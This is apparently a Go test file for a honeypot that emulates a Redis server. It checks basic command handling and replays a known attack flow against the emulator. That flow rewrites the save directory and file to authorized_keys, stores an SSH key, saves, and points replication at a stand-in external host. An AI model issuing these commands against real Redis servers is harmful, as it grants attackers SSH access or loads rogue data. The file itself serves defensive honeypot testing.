package honeypot

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"
)

func TestServerSmokeInlineAndRESPCommands(t *testing.T) {
	server := newTestServer(t, "legacy6")
	errCh := make(chan error, 1)
	go func() {
		errCh <- server.Start()
	}()
	t.Cleanup(func() {
		server.Stop()
		select {
		case err := <-errCh:
			if err != nil {
				t.Fatalf("server returned error: %v", err)
			}
		case <-time.After(time.Second):
			t.Fatal("server did not stop")
		}
	})

	conn, err := net.Dial("tcp", server.Addr().String())
	if err != nil {
		t.Fatalf("Dial returned error: %v", err)
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)

	writeCommand(t, conn, "PING\r\n")
	if got := readRESP(t, reader); got != "+PONG\r\n" {
		t.Fatalf("PING got %q", got)
	}

	writeCommand(t, conn, "*3\r\n$3\r\nSET\r\n$5\r\nsmoke\r\n$5\r\nvalue\r\n")
	if got := readRESP(t, reader); got != "+OK\r\n" {
		t.Fatalf("RESP SET got %q", got)
	}

	writeCommand(t, conn, "GET smoke\r\n")
	if got := readRESP(t, reader); got != "$5\r\nvalue\r\n" {
		t.Fatalf("inline GET got %q", got)
	}

	writeCommand(t, conn, "INFO server\r\n")
	if got := readRESP(t, reader); !strings.Contains(got, "redis_version:6.2.18") {
		t.Fatalf("INFO got %q", got)
	}
}

func TestServerSmokeHoneypotFlow(t *testing.T) {
	server := newTestServer(t, "current8")
	errCh := make(chan error, 1)
	go func() {
		errCh <- server.Start()
	}()
	t.Cleanup(func() {
		server.Stop()
		select {
		case err := <-errCh:
			if err != nil {
				t.Fatalf("server returned error: %v", err)
			}
		case <-time.After(time.Second):
			t.Fatal("server did not stop")
		}
	})

	conn, err := net.Dial("tcp", server.Addr().String())
	if err != nil {
		t.Fatalf("Dial returned error: %v", err)
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)

	flow := []string{
		"CONFIG GET dir\r\n",
		"CONFIG SET dir /tmp\r\n",
		"CONFIG SET dbfilename authorized_keys\r\n",
		"SET crackit ssh-rsa-AAAA\r\n",
		"SAVE\r\n",
		"SLAVEOF 198.51.100.10 6379\r\n",
		"REPLCONF listening-port 6379\r\n",
	}
	for _, command := range flow {
		writeCommand(t, conn, command)
		got := readRESP(t, reader)
		if strings.HasPrefix(command, "CONFIG GET") {
			if !strings.Contains(got, "dir") {
				t.Fatalf("%q got %q", command, got)
			}
			continue
		}
		if got != "+OK\r\n" {
			t.Fatalf("%q got %q, want OK", command, got)
		}
	}

	writeCommand(t, conn, "PSYNC ? -1\r\n")
	if got := readRESP(t, reader); !strings.HasPrefix(got, "+FULLRESYNC ") {
		t.Fatalf("PSYNC first reply got %q", got)
	}
	if got := readRESP(t, reader); got != "$0\r\n\r\n" {
		t.Fatalf("PSYNC RDB payload got %q", got)
	}
}

func writeCommand(t *testing.T, conn net.Conn, command string) {
	t.Helper()
	if err := conn.SetDeadline(time.Now().Add(time.Second)); err != nil {
		t.Fatalf("SetDeadline returned error: %v", err)
	}
	if _, err := fmt.Fprint(conn, command); err != nil {
		t.Fatalf("write %q returned error: %v", command, err)
	}
}

func readRESP(t *testing.T, reader *bufio.Reader) string {
	t.Helper()

	first, err := reader.ReadByte()
	if err != nil {
		t.Fatalf("ReadByte returned error: %v", err)
	}
	line, err := reader.ReadString('\n')
	if err != nil {
		t.Fatalf("ReadString returned error: %v", err)
	}
	head := string(append([]byte{first}, []byte(line)...))

	switch first {
	case '+', '-', ':':
		return head
	case '$':
		length, err := strconv.Atoi(strings.TrimSpace(line))
		if err != nil {
			t.Fatalf("invalid bulk length %q: %v", line, err)
		}
		if length < 0 {
			return head
		}
		body := make([]byte, length+2)
		if _, err := io.ReadFull(reader, body); err != nil {
			t.Fatalf("ReadFull bulk returned error: %v", err)
		}
		return head + string(body)
	case '*':
		count, err := strconv.Atoi(strings.TrimSpace(line))
		if err != nil {
			t.Fatalf("invalid array length %q: %v", line, err)
		}
		if count < 0 {
			return head
		}
		var builder strings.Builder
		builder.WriteString(head)
		for i := 0; i < count; i++ {
			builder.WriteString(readRESP(t, reader))
		}
		return builder.String()
	default:
		t.Fatalf("unknown RESP prefix %q", first)
		return ""
	}
}
